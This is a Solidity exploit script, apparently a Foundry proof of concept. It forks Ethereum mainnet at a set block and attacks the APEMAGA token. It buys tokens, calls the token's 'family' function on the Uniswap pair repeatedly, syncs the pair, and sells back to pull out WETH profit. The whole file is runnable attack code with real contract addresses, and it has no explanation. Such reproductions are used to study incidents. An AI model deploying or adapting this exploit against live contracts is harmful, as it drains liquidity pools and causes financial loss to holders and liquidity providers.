// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface APEMAGA is IERC20 {
    function family(address account) external;
}

interface IUniswapV2Router {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
    
    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);
}

interface Uni_Pair_V2 {
    function sync() external;
}

interface CheatCodes {
    function createSelectFork(string calldata, uint256) external returns (uint256);
    function deal(address token, address to, uint256 amount) external;
}

contract Exploit {
    CheatCodes cheats;
    Uni_Pair_V2 pair;
    IUniswapV2Router router;
    APEMAGA apemaga;
    IERC20 usdt;
    IERC20 weth;

    function run() external payable returns (uint256) {
        cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
        pair = Uni_Pair_V2(0x85705829c2f71EE3c40A7C28f6903e7c797c9433);
        router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        apemaga = APEMAGA(0x56FF4AfD909AA66a1530fe69BF94c74e6D44500C);
        usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);
        weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
        cheats.createSelectFork("mainnet", 20175261);
        cheats.deal(address(weth), address(this), 9 ether);
        uint256 start = weth.balanceOf(address(this));
        attack();
        uint256 end = weth.balanceOf(address(this));
        return end - start;
    }

    function attack() internal {
        swap_token_to_ExactToken(0.1 ether, address(weth), address(apemaga), 8000 ether);
        apemaga.family(address(pair));
        apemaga.family(address(pair));
        apemaga.family(address(pair));
        pair.sync();
        address[] memory path = new address[](2);
        path[0] = address(apemaga);
        path[1] = address(weth);
        apemaga.approve(address(router), 99999999 ether);
        router.swapExactTokensForTokens(
            apemaga.balanceOf(address(this)),
            0,
            path,
            address(this),
            type(uint256).max
        );
    }

    function swap_token_to_ExactToken(
        uint256 amount,
        address a,
        address b,
        uint256 amountInMax
    ) internal {
        IERC20(a).approve(address(router), amountInMax);
        address[] memory path = new address[](2);
        path[0] = a;
        path[1] = b;
        router.swapExactETHForTokens{value: amount}(
            0,
            path,
            address(this),
            block.timestamp + 120
        );
    }
}
